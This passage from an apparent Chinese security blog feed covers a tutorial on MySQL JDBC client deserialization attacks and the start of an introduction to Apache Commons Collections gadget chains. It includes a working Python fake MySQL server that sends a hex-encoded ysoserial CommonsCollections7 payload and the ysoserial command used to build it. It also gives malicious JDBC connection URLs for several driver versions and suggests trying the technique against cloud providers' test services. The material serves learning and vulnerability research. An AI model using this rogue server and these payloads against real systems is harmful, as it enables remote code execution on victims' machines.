54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>结合我们所使用的CC链，这里假设目标存在CC链7的漏洞，使用<code>ysoserial</code>构造 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections7 calc &gt; payload</span><br><span class="line">python3 fake_mysql.py</span><br></pre></td></tr></table></figure><p>最终的效果其实是如下的：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204047.png"></p><h2 id="JDBC连接mysql的过程"><a href="#JDBC连接mysql的过程" class="headerlink" title="JDBC连接mysql的过程"></a>JDBC连接mysql的过程</h2><p>其实在JDBC连接到Mysql的过程中，有几条内置sql语句被发出，其中两个查询的结果集会在客 ⼾端被处理时会调⽤ObjectInputStream.readObject()进⾏反序列化</p><p>这两个查询语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> SESSION STATUS <span class="operator">/</span><span class="operator">/</span>查看session连接数,状态</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">COLLATION</span> <span class="operator">/</span><span class="operator">/</span>显⽰MySQL⽀持字符集的排序规则</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204731.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128204851.png"></p><p>我们可以利用这个机制将这两个查询语句，在服务器端“重定向”为查询恶意表，恶意表中某字段存放 恶意Object。</p><p>接下来以 <code>wireshark</code>进行演示</p><blockquote><p>因为是以本地的进行演示，所以需要使用<code>npcap</code>.因为默认的wireshark使用的是<code>winpcap</code>，它不会抓取<code>本地环回</code>的数据包,好像下载了goby之后默认也会下载npcap</p></blockquote><p>选择loopback</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128205704.png"></p><p>使用<code>tcp.port==3306&amp;&amp;mysql</code>我们来过滤协议</p><p>期间有几个坑就是，在连接时候提醒你加一些参数，如下</p><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">characterEncoding<span class="operator">=</span>utf8<span class="operator">&amp;</span>serverTimezone<span class="operator">=</span>UTC<span class="operator">&amp;</span>useSSL<span class="operator">=</span><span class="literal">false</span></span><br></pre></td></tr></table></figure></blockquote><p>接下来分析数据包</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128211709.png"></p><p>登录之后，执行内置的sql语句<code>show session status</code></p><h3 id="建立连接的响应包"><a href="#建立连接的响应包" class="headerlink" title="建立连接的响应包"></a>建立连接的响应包</h3><p>根据mysql协议，我们首先需要建立连接，那么，首先需要给mysql客户端发送连接成功的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220128212159.png"></p><p>所以发送<code>0700000200000002000000</code>即可，他就是<code>Response OK</code>的数据包的关键内容&#96;</p><h3 id="问候报文之后的响应包"><a href="#问候报文之后的响应包" class="headerlink" title="问候报文之后的响应包"></a>问候报文之后的响应包</h3><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129182807.png"></p><p>在发送问候报文之后，客户端还可能发送其他数据包查询mysql的其他信息，如上图</p><p>查看返回的数据包，根据协议类型，可以看到，返回数据包如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129183026.png"></p><p>所以我们伪造的mysql服务器端的时候，在交互数据包的时候，可以发送如上数据包进行一个假的身份认证。</p><p>上面师傅的脚本对更多数据查询的情况做了分类，原理类似。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先<code>payload</code>为：</p><p><code>jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</code></p><p>这里对<code>ServerStatusDiffInterceptor</code>的拦截做一个分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">getObjectDeserializingIfNeeded:<span class="number">4563</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">getObject:<span class="number">4537</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">resultSetToMap:<span class="number">467</span>, Util (com.mysql.jdbc)</span><br><span class="line">populateMapWithSessionStatusValues:<span class="number">69</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">84</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">54</span>, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:<span class="number">65</span>, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:<span class="number">2865</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:<span class="number">2586</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2491</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2449</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:<span class="number">1381</span>, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:<span class="number">3797</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3230</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2243</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2025</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">778</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">47</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">425</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">386</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">330</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">13</span>, Test (JDBC)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129194636.png"></p><p>可以清楚看到 data在接受传递的数据之后，如果开启<code>autoDeserialize=true</code>的属性，则会将得到的属性，继续进行反序列化。</p><p>后面的步骤就是参考 CC链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject            </span><br><span class="line">     Hashtable.reconstitutionPut</span><br><span class="line">         AbstractMapDecorator.equals</span><br><span class="line">             AbstractMap.equals</span><br><span class="line">                 LazyMap.get                </span><br><span class="line">                   ChainedTransformer.transform</span><br><span class="line">                       InvokerTransformer.transform</span><br><span class="line">                          Runtime.exec</span><br></pre></td></tr></table></figure><h2 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h2><p>注：以下payload有时对应的情况需要设置 SSL，以及serverTimezone等等参数</p><h2 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h2><h3 id="8-x"><a href="#8-x" class="headerlink" title="8.x"></a>8.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><h3 id="5-x"><a href="#5-x" class="headerlink" title="5.x"></a>5.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><h2 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h2><h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29 - 5.1.40"></a>5.1.29 - 5.1.40</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span></span><br></pre></td></tr></table></figure><h3 id="5-1-28-5-1-19"><a href="#5-1-28-5-1-19" class="headerlink" title="5.1.28 - 5.1.19"></a>5.1.28 - 5.1.19</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?autoDeserialize=true</span></span><br></pre></td></tr></table></figure><h2 id="实际应用情况"><a href="#实际应用情况" class="headerlink" title="实际应用情况"></a>实际应用情况</h2><p>在暑假公司师傅挖掘 JDSRC的时候，挖到这么一个漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220129195829.png"></p><p>因为现在很多云服务器是基于<code>openstack</code>开发的，所以他们有着很多相似之处，大家遇到了也可以挖挖看</p><blockquote><p>openstack是什么：<a href="http://c.biancheng.net/view/3892.html">http://c.biancheng.net/view/3892.html</a></p></blockquote><p>很多云服务厂商有时会提供部署项目等业务，会在本地的云服务器起一台docker等服务以供进行测试，在这时候，服务器端是我们可控的，我们可以尝试这种方法进行攻击。</p><h2 id="专门用于mysql伪造的工具"><a href="#专门用于mysql伪造的工具" class="headerlink" title="专门用于mysql伪造的工具"></a>专门用于mysql伪造的工具</h2><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">GitHub - fnmsd&#x2F;MySQL_Fake_Server: MySQL Fake Server use to help MySQL Client File Reading and JDBC Client Java Deserialize</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[MySQL JDBC反序列化漏洞 <a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#JDBC%E7%AE%80%E4%BB%8B"> Mi1k7ea ]</a></p><p><a href="https://xz.aliyun.com/t/8159#toc-3">小白看得懂的MySQL JDBC 反序列化漏洞分析 - 先知社区 (aliyun.com)</a></p><p><a href="https://paper.seebug.org/1227/#72">MySQL JDBC 客户端反序列化漏洞 (seebug.org)</a></p>]]></content>
    
    
    <summary type="html">对JDBC反序列化漏洞的学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>java安全入门(二)--CC链</title>
    <link href="https://h0ld1rs.github.io/posts/22734.html"/>
    <id>https://h0ld1rs.github.io/posts/22734.html</id>
    <published>2022-01-15T09:29:02.000Z</published>
    <updated>2022-03-13T16:19:02.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java安全入门-二"><a href="#java安全入门-二" class="headerlink" title="java安全入门(二)"></a>java安全入门(二)</h1><p>上节的内容，重点要知道：</p><ol><li><p>java是半编译型，半解释性语言，需要将编译好的<code>.class</code>文件放入JVM中加载</p></li><li><p>我们通过反射可以从已经运行的JVM中拿到我们想要的类，从类中获取构造方法，进行实例化，调用相关的方法，主要是Runtime的命令执行</p></li><li><p>java的序列化和反序列化，反序列化时会调用<code>readObject()</code>方法，我们构造的readObject方法，需要满足和原项目中的包名一样的包名</p><p><code>hexdump -C Calc.class</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118180237.png"></p></li></ol><p>​    上节课忘记讲了，，我们在传递数据的时候，为了保险稳定，一般会传入字节码</p><p>​    可以看到，class中是带了包名，我们说过，类是对象的模板，那么，在序列化对象的时候，如果包名出现了问题，自然会遇到一系列问题。</p><h2 id="CC链1"><a href="#CC链1" class="headerlink" title="CC链1"></a>CC链1</h2><p>我们已经知道了序列化和反序列化漏洞的基本原理，那么怎么通过构造恶意数据，让反序列化产⽣⾮ 预期对象呢？</p><p>我们以CC链进行举例</p><h3 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h3><p>Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合⼯ 具类。</p><blockquote><p>collection是set，list，queue的抽象。</p></blockquote><p>作为Apache开源项⽬的重要组件，Commons Collections被⼴泛应⽤于各种Java应⽤的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。</p><p><strong>Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer。</strong></p><h3 id="前置疑问"><a href="#前置疑问" class="headerlink" title="前置疑问"></a>前置疑问</h3><h4 id="使用反射获取的Runtime类，为什么可以放到readObject方法中"><a href="#使用反射获取的Runtime类，为什么可以放到readObject方法中" class="headerlink" title="使用反射获取的Runtime类，为什么可以放到readObject方法中"></a>使用反射获取的Runtime类，为什么可以放到<code>readObject</code>方法中</h4><p>实际上，我们简短的描述进行命令执行的化，就是这样，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="string">&quot;null&quot;</span>).exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><p>而我们使用反射的原因是因为，我们通过反射获取<code>Runtime</code>类以后，他就实现了Class本身所继承的<code>Serializable</code></p><p>我么现在写一个最基本的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们使用 <code>ctrl alt v</code>补全类型以后，会发现他是Class &lt;&gt;的泛型，当我们长按<code>ctrl</code>，左键点进去之后，就很明显的发现，它实现了<code>Serializable</code>接口，那么，他就满足了序列化的条件</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118183922.png"></p><h4 id="Runtime-用的时候不用-new吗？"><a href="#Runtime-用的时候不用-new吗？" class="headerlink" title="Runtime 用的时候不用 new吗？"></a>Runtime 用的时候不用 new吗？</h4><p>如果你有这样的疑惑，你不妨这样试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Runtime runtime;</span><br><span class="line">        runtime = <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>它肯定是会报错的，因为他是一个单例类，，具体什么叫单例类，，自己可以看一下java的基础知识去，</p><blockquote><p>参考java设计模式中单例模式就可</p></blockquote><p>这里放一张图</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220118185236.png"></p><p>所以我们需要用<code>getRuntime</code>方法去获取实例</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li><p>CommonsCollections &lt;&#x3D; 3.2.1</p></li><li><p>java &lt; 8u71（我是用的是8u66）</p></li><li><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然也可以 用传统的 <code>lib</code>包下导入<code>add as a library</code></p></li></ul><h3 id="在CC链中使用的类"><a href="#在CC链中使用的类" class="headerlink" title="在CC链中使用的类"></a>在CC链中使用的类</h3><p>理解完上面的知识以后，你应该对反射和序列化有了初步的印象，接下来我们需要结合两者看几个demo</p><h4 id="Map类-gt-TransformedMap"><a href="#Map类-gt-TransformedMap" class="headerlink" title="Map类-&gt;TransformedMap"></a>Map类-&gt;TransformedMap</h4><blockquote><p>Map类是存储键值对的数据结构。 Apache Commons Collections中实现了TransformedMap ， 具体的变换逻辑由Transformer类定义。</p><p><strong>也就是说，TransformedMap类中的数据发⽣改变时， 可以⾃动对进⾏⼀些特殊的变换，⽐如在数据被修改时，把它改回来; 或者在数据改变时，进⾏⼀ 些我们提前设定好的操作。</strong></p><p>而实现怎么样的操作或者便换，都是我们提前设定好的，这叫做<code>transform</code></p></blockquote><p>我们可以使用<code>TransformedMap.decorate()</code>方法获取一个<code>TransformedMap</code>的实例 (同单例类)</p><p><img 